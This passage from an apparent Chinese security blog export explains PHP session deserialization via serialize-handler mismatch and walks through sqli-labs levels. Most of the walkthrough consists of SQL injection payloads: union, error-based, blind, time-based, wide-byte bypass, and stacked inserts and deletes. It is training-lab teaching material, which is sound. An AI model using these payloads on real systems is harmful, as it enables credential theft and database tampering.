<h1 id="pickle的应用"><a href="#pickle的应用" class="headerlink" title="pickle的应用"></a>pickle的应用</h1><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">新版FLASK下python内存马的研究</a><br>这给师傅已经奖pickle的方法讲的很清楚了，本人这篇文章也是学自这位师傅</p>
]]></content>
      <categories>
        <category>内存马</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>session反序列化</title>
    <url>/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="在之前打帕鲁杯的时候遇到了，php写入文件来修改session进行伪造的题目。今天不知道学什么突然就想到了session反序列化我还没水过博客，于是写下这篇学习博客"><a href="#在之前打帕鲁杯的时候遇到了，php写入文件来修改session进行伪造的题目。今天不知道学什么突然就想到了session反序列化我还没水过博客，于是写下这篇学习博客" class="headerlink" title="在之前打帕鲁杯的时候遇到了，php写入文件来修改session进行伪造的题目。今天不知道学什么突然就想到了session反序列化我还没水过博客，于是写下这篇学习博客"></a>在之前打帕鲁杯的时候遇到了，php写入文件来修改session进行伪造的题目。今天不知道学什么突然就想到了session反序列化我还没水过博客，于是写下这篇学习博客</h1><h1 id="php-session介绍"><a href="#php-session介绍" class="headerlink" title="php session介绍"></a>php session介绍</h1><p>首先我们都知道session是以文件的形式存储在服务端的，文件的内容是经过序列化后的数据。而存储的具体格式主要与下面几个php.ini设置有关<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_path：这是session文件的储存路径</span><br><span class="line">session.auto_start：这个开关是指定是否在请求开始时就自动启动一个会话，默认为Off；如果它为On的话，相当于就先执行了一个session_start()，会生成一个session_id，一般来说这个开关是不会打开的</span><br><span class="line">session.save_handler：这个是设置用户自定义session存储的选项，默认是files，也就是以文件的形式来存储的</span><br><span class="line">session.serialize_handler：这是最重要的部分，定义用来序列化/反序列化的处理器名字，默认使用php，还有其他引擎，且不同引擎的对应的session的存储方式不相同，默认是php</span><br></pre></td></tr></table></figure></p>
<h2 id="session-serialize-handler"><a href="#session-serialize-handler" class="headerlink" title="session.serialize_handler"></a>session.serialize_handler</h2><p>这个设置主要定义使用什么处理器来对内容进行存储不同的处理器存储格式不同</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">处理器名称</th>
<th style="text-align:left">格式</th>
<th style="text-align:left">存储结果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">php</td>
<td style="text-align:left">键名+竖线+序列化处理后的内容</td>
<td style="text-align:left">name&#124;s:6:”hahaha”;</td>
</tr>
<tr>
<td style="text-align:center">php_binary</td>
<td style="text-align:left">键名的长度对应的ASCII字符+键名+经过serialize()函数反序列处理的值</td>
<td style="text-align:left">names:6:”hahaha”;</td>
</tr>
<tr>
<td style="text-align:center">php_serialize</td>
<td style="text-align:left">经过 serialize() 函数反序列处理的数组</td>
<td style="text-align:left">a:1:{s:4:”name”;s:6:”hahaha”;}</td>
</tr>
</tbody>
</table>
</div>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>我们通过下面这个DEMO进行讲解<br><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" class="" title="alt text"></p>
<img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" class="" title="alt text">
<p>我们先来看一下session_start()函数的定义<br><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" class="" title="alt text"><br>会发现每次向服务器用GET,POST,COOKIE的方法来传入sessionid，都会重启session服务并将session文件的内容进行反序列化存储在<code>$_SESSION</code>里。<br>当然在反序列化正常的赋值存储的session值并不会出现问题，但是如果一个web的不同路由采用了不同的处理器这就有可能导致本不该杯反序列化的内容杯反序列化。<br>当我们给a传入|O:1:”A”:1:{s:1:”f”;s:5:”hahah”;}在访问flag.php时由于其处理器为php这就导致了其会将|后的进行解析为序列化语句而不是字符串从而进行反序列化。</p>
<h1 id="无-SESSION变量的赋值"><a href="#无-SESSION变量的赋值" class="headerlink" title="无$_SESSION变量的赋值"></a>无$_SESSION变量的赋值</h1><p>在没有赋值代码时我们可以利用<a href="https://www.php.net/manual/zh/session.upload-progress.php">session上传进度</a>来进行session的上传</p>
<p>我们只要在发文件的同时post一个session.upload_progress.name的同名变量<br><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" class="" title="alt text"><br>form表单如下<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><br>注意因为表单没有cookie所以我们要手动添加PHPSESSID<br>但是其上传后内容会很快被清空所以我们要不断发包<br><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" class="" title="alt text"><br><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" class="" title="alt text"><br>可以看到post的value被存储了起来<br>那么我们便可以在无法对$_SESSION赋值时使用这个来上传session文件从而进行session反序列化。</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>因为没有找到题目所以先放着</p>
]]></content>
      <categories>
        <category>php</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs less32-37宽字节绕过</title>
    <url>/2023/12/12/sqli-labs-less32-37%E5%AE%BD%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="less32"><a href="#less32" class="headerlink" title="less32"></a>less32</h1><p>这关我们直接查看源码<br><br>我们可以看到引入可gbk编码</p>
<h2 id="gbk编码"><a href="#gbk编码" class="headerlink" title="gbk编码"></a>gbk编码</h2><p>编码包括了双字节字符集和单字节字符集<br>单字符编码：如ascii码，单字节字符集表示其内部的所以字符都是由单字节表示的<br>双字节字符集：也称为宽字符，双字节字符集表示其内部字符是由两个字节来表示的，其导致的漏洞大多是因为服务器错误的将两个单字节错误的编码为宽字符<br>宽字符：用多个字节来表示的字符集<br>宽字节：:GB2312、GBK、GB18030、BIG5、ShiftJIS都是宽字节，其是由两个单字节来表示。其漏洞基本是由于输入多个单字节导致单字节被当成宽字节导致的，<strong>gbk码只有当前一个字节的ascii码值大于128才到汉字的范围</strong></p>

<p>函数<code>preg_replace($str,$str1,$str2)</code>表示交换需要过滤的字符,即判断<code>str2</code>里有没有<code>str</code>由则将<code>str</code>转换成<code>str1</code><br><code>preg_quote($str)</code>会将字符串中的所有特殊字符前添加一个\使其实体化。<br>这样就导致了我们输入’会被添加上\导致转意。这时候我们就可以利用宽字节绕过<br>由于<code>\</code>的url编码为%5c，这时候我们可以在%5c前加一个%df这时候就会组成为%df%5c而这两个字节就表示一个汉字，这时候这个汉字就把\给吃了这时候我们的’就不会被转意。就可以成功绕过<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273</span><br></pre></td></tr></table></figure><br><strong>注意：因为在后面的查询语句中将\’的<code>\</code>给转换成汉字会导致语句报错所以我们，要将最后where table_name=的表名转换成16进制这样可以不用使用’</strong></p>
<h1 id="less33"><a href="#less33" class="headerlink" title="less33"></a>less33</h1><p>这关与上一个几乎相同，只是过滤的函数为<code>addslashes()</code>这一个函数是将字符串中的使用特殊字符转意。其绕过方法与32相同都是利用gbk的宽字节绕过</p>
<h1 id="less34"><a href="#less34" class="headerlink" title="less34"></a>less34</h1><p>这关我们直接抓包，因为在使用使用hackbar的时候出现了一个问题如图<br><img src="/2023/12/12/sqli-labs-less32-37%E5%AE%BD%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/34-1.png" class="" title="Alt text"><br>我们可以看到显示了<code>URL malformed（url畸形）</code>显示这个的原因是%被urlencode成了%25这也就导致这个报错。<br>我们直接抓包查看果然我们看到了在%df变成了%25df多了个25这个是%被url编码导致的，把25删了之后就是正常的解题步骤了<br><img src="/2023/12/12/sqli-labs-less32-37%E5%AE%BD%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/34-2.png" class="" title="Alt text"></p>
<h1 id="less-35"><a href="#less-35" class="headerlink" title="less 35"></a>less 35</h1><p>这一关我们在注入?id=%df’的时候发现’被转意没有现象与前几关都不同，我们查看源码发现，他是数字型注入。。。。这告诉我们不要字符型的做傻了吧去考虑数字型注入,既然是数字型那么就不需要闭合了直接union注入</p>
<h1 id="less-36"><a href="#less-36" class="headerlink" title="less 36"></a>less 36</h1><p>该题目与32关几乎没有区别只是，其过滤的语句为mysql_real_escape_string()这个函数是sql的语句是将字符串中的特殊字符转义</p>
<h1 id="less-37"><a href="#less-37" class="headerlink" title="less 37"></a>less 37</h1><p>和37一模一样只是过滤方法改成了mysql_real_escape_string()</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>靶场</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>top10</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs less38-45</title>
    <url>/2023/12/13/sqlilabs-less38-45/</url>
    <content><![CDATA[<h1 id="less-38"><a href="#less-38" class="headerlink" title="less 38"></a>less 38</h1><p>我们打开源码<br></p>
<h2 id="看到一个叫mysql-connect-的函数打开到一个mysql服务器的新连接，返回一个代表到-MySQL-服务器的连接的对象。"><a href="#看到一个叫mysql-connect-的函数打开到一个mysql服务器的新连接，返回一个代表到-MySQL-服务器的连接的对象。" class="headerlink" title="看到一个叫mysql_connect()的函数打开到一个mysql服务器的新连接，返回一个代表到 MySQL 服务器的连接的对象。"></a><strong>看到一个叫mysql_connect()的函数打开到一个mysql服务器的新连接，返回一个代表到 MySQL 服务器的连接的对象。</strong></h2><p>mysql_connect(host,username,password,dbname,prok,socket)<br>host：必写，表示一个服务器的主机域名<br>username:必写，表示mysql服务器的用户名<br>password：可写，表示密码<br>dbname：可选，表示要连接的数据库<br>prok：可选，表示mysql服务器的连接端口<br>socket:可选，表示所要使用的socket和已命名的pipe<br>socket就是我们在发送时，帮助我们发送保护我们数据，打包数据等的东西，就像一个物流公司一样当我们发送时帮我们进行一系列操作<br><img src="2.png" alt="Alt text"></p>
<h2 id="2-mysql-connect-errno-该函数于mysql-connect-有关连，会放回一个错误连接的代码，如果没有连接错误就返回0"><a href="#2-mysql-connect-errno-该函数于mysql-connect-有关连，会放回一个错误连接的代码，如果没有连接错误就返回0" class="headerlink" title="2.mysql_connect_errno()该函数于mysql_connect()有关连，会放回一个错误连接的代码，如果没有连接错误就返回0"></a>2.mysql_connect_errno()该函数于mysql_connect()有关连，会放回一个错误连接的代码，如果没有连接错误就返回0</h2><h2 id="3-mysql-select-db-查询所连接数据库的的一些php代码"><a href="#3-mysql-select-db-查询所连接数据库的的一些php代码" class="headerlink" title="3.mysql_select_db()查询所连接数据库的的一些php代码"></a>3.mysql_select_db()查询所连接数据库的的一些php代码</h2><p>语法<br>mysql_select_db(connection,dbname)<br>connection:必写，规定要使用的mysql的连接，也就是MySQL_connect()的返回值</p>
<h2 id="4-mysqli-error-函数返回最近调用函数的最后一个错误描述。也就是报错"><a href="#4-mysqli-error-函数返回最近调用函数的最后一个错误描述。也就是报错" class="headerlink" title="4.mysqli_error() 函数返回最近调用函数的最后一个错误描述。也就是报错"></a>4.mysqli_error() 函数返回最近调用函数的最后一个错误描述。也就是报错</h2><p>语法mysqli_error(connection)connection一个mysql服务器的连接</p>
<h2 id="5-mysqli-close-connection-函数关闭先前打开的数据库连接。成功返回true错误false"><a href="#5-mysqli-close-connection-函数关闭先前打开的数据库连接。成功返回true错误false" class="headerlink" title="5.mysqli_close(connection); 函数关闭先前打开的数据库连接。成功返回true错误false"></a>5.mysqli_close(connection); 函数关闭先前打开的数据库连接。成功返回true错误false</h2><h2 id="6-mysqli-multi-query-执行一个或多个针对数据库的查询"><a href="#6-mysqli-multi-query-执行一个或多个针对数据库的查询" class="headerlink" title="6.mysqli_multi_query():执行一个或多个针对数据库的查询"></a>6.mysqli_multi_query():执行一个或多个针对数据库的查询</h2><p>语法：mysqli_multi_query(connection,query)<br>connection:必选；规定使用的MySQL连接<br>query:必选；规定一个或者多个查询；中间用分号连接</p>
<h2 id="7-mysqli-more-results-检查是否有更多查询结果"><a href="#7-mysqli-more-results-检查是否有更多查询结果" class="headerlink" title="7.mysqli_more_results()检查是否有更多查询结果"></a>7.mysqli_more_results()检查是否有更多查询结果</h2><h2 id="8：mysqli-store-result-将查询结果保存到变量中"><a href="#8：mysqli-store-result-将查询结果保存到变量中" class="headerlink" title="8：mysqli_store_result()将查询结果保存到变量中"></a>8：mysqli_store_result()将查询结果保存到变量中</h2><h2 id="9-mysqli-fetch-row-将查询结果一行一行的提取为数组"><a href="#9-mysqli-fetch-row-将查询结果一行一行的提取为数组" class="headerlink" title="9:mysqli_fetch_row()将查询结果一行一行的提取为数组"></a>9:mysqli_fetch_row()将查询结果一行一行的提取为数组</h2><h1 id="堆叠注入的原理。"><a href="#堆叠注入的原理。" class="headerlink" title="堆叠注入的原理。"></a>堆叠注入的原理。</h1><p>mysqli_multi_query()由于这个语句可以查询多个sql语句，那么将第一个sql语句以分号结束后再写下另一个sql语句这时候就会执行两个语句，而第二个sql语句不仅可以查询还可以对数据库进行修改。</p>
<h1 id="堆叠注入的注入条件"><a href="#堆叠注入的注入条件" class="headerlink" title="堆叠注入的注入条件"></a>堆叠注入的注入条件</h1><p>我们都知道堆叠注入是由于sql服务器解析多个sql语句造成的，那么只要服务器可以查询多个语句就存在堆叠注入。也就是后台的查询函数是类似于mysqli_multi_query()的。二mysqli_query()只能执行单sql语句。<br>增删改查的语句请查看这个语句<a href="https://lisien11.github.io/2023/11/09/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/">sql注入的学习</a><br>改题目可以直接使用堆叠注入修改数据<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;; insert into users(username,password,id)value(&#x27;dazhuang&#x27;,&#x27;111&#x27;,100)--+</span><br></pre></td></tr></table></figure><br><img src="/2023/12/13/sqlilabs-less38-45/38-3.png" class="" title="Alt text"><br>输入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;;delete from users where username=&#x27;dazhuang&#x27;</span><br></pre></td></tr></table></figure><br><img src="/2023/12/13/sqlilabs-less38-45/38-4.png" class="" title="Alt text"><br>可以看到我们成功的增添和删除了数据库的数据<br>这样就可以向数据库插入内容了</p>
<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p>于38也一样只是闭合不同</p>
<h1 id="less40和41"><a href="#less40和41" class="headerlink" title="less40和41"></a>less40和41</h1><p>40为单引号盲注，41为单引号union注入</p>
<h1 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h1><p>为post的注入我们查看源码发现，username存在过滤函数mysqli_real_escape_string()会转义特殊字符。所以注入电位password<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login_password=admin&#x27; union select 1,(select database()),3--+&amp;login_user=admin&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></p>
<h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><p>和上一题一样只是闭合方式不同位’)</p>
<h1 id="less44"><a href="#less44" class="headerlink" title="less44"></a>less44</h1><p>该题目为单字符盲注</p>
<h1 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h1><p>为单引号括号盲注</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>靶场</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>top10</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs的wp</title>
    <url>/2023/11/16/sqli-labs%E7%9A%84wp/</url>
    <content><![CDATA[<h1 id="less1-less4"><a href="#less1-less4" class="headerlink" title="less1~less4"></a>less1~less4</h1><h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>我们先在url上输入<code>?id=1</code>进行尝试发现屏幕回显如下<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/screenshot20231116.png" class="" title="Alt text"><br>证明存在注入点<br>接下来我们判断为什么类型的注入，输入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2-1;</span><br></pre></td></tr></table></figure><br>发现屏幕回显如下</p>
<p>与?id=1不同<br>所以为字符型注入,因为是字符型注入所以我们需要找到闭合方式输入<br><code>?id=1&#39;--+</code>成功回显所以他的闭合方式为<code>&#39;</code></p>
<p>接下来我们查询该表的列数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 列数--+</span><br></pre></td></tr></table></figure><br>我们发现当我们order by 4时报错而order by 3时没报错所以判断该表列数为3<br>接下来我们查看回显位置<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure><br>回显如下<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/2.png" class="" title="Alt text"><br>证明回显位置是2和3<br>接下来我们可以查询数据库名称代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3</span><br></pre></td></tr></table></figure><br>查询出库名为’security’<br>在查询这个库中的表名<br>代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure><br>屏幕在原本3的位置下回显出表名如下<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/4.png" class="" title="Alt text"><br>查询表名可以猜测重要数据应在users里<br>现在我们查询users的列名代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><br>回显<img src="/2023/11/16/sqli-labs%E7%9A%84wp/5.png" class="" title="Alt text"><br>最后查询username和password就好了代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,password) from users--+</span><br></pre></td></tr></table></figure><br>回显出账号密码<img src="/2023/11/16/sqli-labs%E7%9A%84wp/1.png" class="" title="Alt text"></p>
<h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>先输入以下代码<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">2</span><span class="number">-1</span></span><br></pre></td></tr></table></figure><br>发现为数字型注入</p>
<p>批判列数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order 列数</span><br></pre></td></tr></table></figure><br>发现为3列</p>
<p>查看回显位<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><br>回显位为2，3</p>
<p>查看库名和版本<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 uniom select 1,database(),version()</span><br></pre></td></tr></table></figure><br>库名为security</p>
<p>查询表名<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><br>发现user表的列名</p>
<p>查询users表的列名<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><br>列名中有username和password</p>
<p>查询username和password<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(username,password) from users</span><br></pre></td></tr></table></figure></p>
<h3 id="less3-less4"><a href="#less3-less4" class="headerlink" title="less3,less4"></a>less3,less4</h3><p>我将less3和less4放在的原因是我认为sqli_labs的第1，3，4关其实都差不多只是闭合的方式不同</p>
<h4 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h4><p>我们先输入?id=1’屏幕回显<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/screenshot20231119.png" class="" title="Alt text"><br>这个报错说明了除我们传入的<code>id=1&#39;</code>后右边为<code>&#39;)</code>那么我们不妨猜测id的闭合方式为<code>(&#39;$id&#39;)</code><br>随后输入<code>?id=1&#39;)--+</code>无报错也可以在后续输入其他语句并回显。剩下的步骤重复less1</p>
<h4 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h4><p>我们一样输入?id=1’<br>无报错成功回显我们在尝试输入id=1”报错回显如下<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/2,20231119.png" class="" title="Alt text"><br>我们发现在我们输入的<code>1&quot;</code>的右侧还有<code>&quot;)</code>那么这题的闭合方式应为<code>&quot;)</code><br>接着就与less1无异了</p>
<h3 id="注意我们可以查询information-schema库schemata表下的schema-name列来查询所以数据库的名称"><a href="#注意我们可以查询information-schema库schemata表下的schema-name列来查询所以数据库的名称" class="headerlink" title="注意我们可以查询information_schema库schemata表下的schema_name列来查询所以数据库的名称"></a>注意我们可以查询information_schema库schemata表下的schema_name列来查询所以数据库的名称</h3><h2 id="less5-less6"><a href="#less5-less6" class="headerlink" title="less5~less6"></a>less5~less6</h2><h3 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h3><p>我们打开sqli-labs的less5先常规输入?id=1发现回显与我们之前的题目有所不同<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/sqli-labs_less5_1.png" class="" title="Alt text"><br>我们在输入<code>?id=1&#39;</code> 报错<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/sqli-labs_less5_2.png" class="" title="Alt text"><br>我们发现有报错那么我们可以利用报错注入，报错注入其实也可以利用在前四题，但是因为前四题有正常的回显位所以采用联合注入是更好的，但是这题并没有正常的回显位所以我们可以采用报错注入<br>我们查看上面的报错发现这题的闭合方式应为<code>&#39;</code><br>随后查询列数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 3--+</span><br></pre></td></tr></table></figure><br>查询到列数为3<br>随后我们进行报错注入我们要用到extractvalue()注入<br>extarctvalue()是一个输入两值的函数第一个函数为文件名第二个为文件在文件夹的地址文件的地址是以<code>/</code>开头的我们可以将/换成<code>~</code>使函数报错在将~后的替换为查询语句，这样就会报错出我们查询的内容下面是注入代码<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select database())))--+</span><br></pre></td></tr></table></figure><br>查询到报错为<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/sqli-labs_less5_3.png" class="" title="Alt text"><br>报错出数据库名为<code>security</code><br>之后在查询所有的库名<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)))--+</span><br></pre></td></tr></table></figure><br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less5-4.png" class="" title="Alt text"><br>我们可以看到报错的字符数没有输出所有的数据库，原因是因为报错注入最多输出30个字符，这时我们就需要用到一个控制输出字符的函数<code>substring()</code><br>substring()有三个参数第一个参数为字符串，第二个表示从第几位输出，第三个代表输出个数<br>大致如下<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">substring</span>((string),<span class="number">1</span>,<span class="number">30</span>) <span class="operator">/</span><span class="operator">/</span>string代表字符串，该代码表示从第<span class="number">1</span>位输出<span class="number">30</span>个字符的字符串</span><br></pre></td></tr></table></figure><br>加入后注入语句如下<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(schema_name) from information_schema.schemata),1,30)))</span></span><br></pre></td></tr></table></figure><br>不断调整输出的范围可以得到所有的数据库名<br>之后就标准的爆表名爆列名查看数据了<br>爆表名<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),1,30)))--+</span></span><br></pre></td></tr></table></figure><br>爆列名<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,30)))--+</span><br></pre></td></tr></table></figure><br>查询数据<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(password,username) from security.users),31,30)))--+</span><br></pre></td></tr></table></figure><br>而less6也大同小异只要将?id=1’的单引号改为双引号</p>
<h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><h2 id="less8-sql布尔盲注"><a href="#less8-sql布尔盲注" class="headerlink" title="less8 sql布尔盲注"></a>less8 sql布尔盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length(str):返回字符串的长度</span><br><span class="line">substr(str,pos,len)</span><br><span class="line">ascii(str)：返回字符串最左边的字符的ascii码值</span><br><span class="line">ord(str)：同上</span><br><span class="line">if(a,b,c)：如果a为真执行b假执行c</span><br></pre></td></tr></table></figure>
<p>我们输入id=1页面回显you are in 输入id=1’不回显输入id=1’—+页面回显证明该题为字符型’闭合<br>我们输入以下代码<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length((select database()))&gt;=1--+</span><br></pre></td></tr></table></figure><br>length函数回返回字符串的长度我们可以通过二分法比较来找出查询到的字符串长度<br>在利用ascii()和substr()来进行构造注入如下的语句<br>(由于查询语句由多个字符串构成所有我们需要将查询语句（）起来)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;100--+</span><br></pre></td></tr></table></figure>
<p>还是通过二分发进行比较其ascii码值来对其字符进行确认<br>之后也一样我们只要对其的查询语句进行修改就可以了<br>可以将<code>select database()</code>进行更改如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select group_concat(table_name) from information_schema.schemata),1,1))&gt;=5</span><br></pre></td></tr></table></figure></p>
<p>less9 时间盲注<br>我们输入?id=1返回you are in再输入?id=1’返回相同值再输入id=1”一样那么这题我们就需要用到时间盲注<br>我们先了解一下sleep()函数该函数执行后那么网页就会延迟数秒响应如<code>sleep(3)</code>那么就会延迟3秒那么我们就可以用以下代码进行查看为什么闭合方式<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and sleep(3)--+</span><br></pre></td></tr></table></figure><br>发现网页延迟3秒才响应那么该题应该就为单引号闭合<br>我们再利用if对注入语句进行编辑<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select database()),1,1))&gt;10,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><br>同理我们只要对if里的查询语句进行替换就可</p>
<h1 id="less10-时间盲注"><a href="#less10-时间盲注" class="headerlink" title="less10 时间盲注"></a>less10 时间盲注</h1><p>同样的这题为时间盲注<br>尝试出闭合方式<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and sleep(3)</span><br></pre></td></tr></table></figure><br>利用下面的语句尝试出数据库名称<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3))</span><br></pre></td></tr></table></figure><br>之后就是替换查询语句进行爆库名，表名列名，查数据</p>
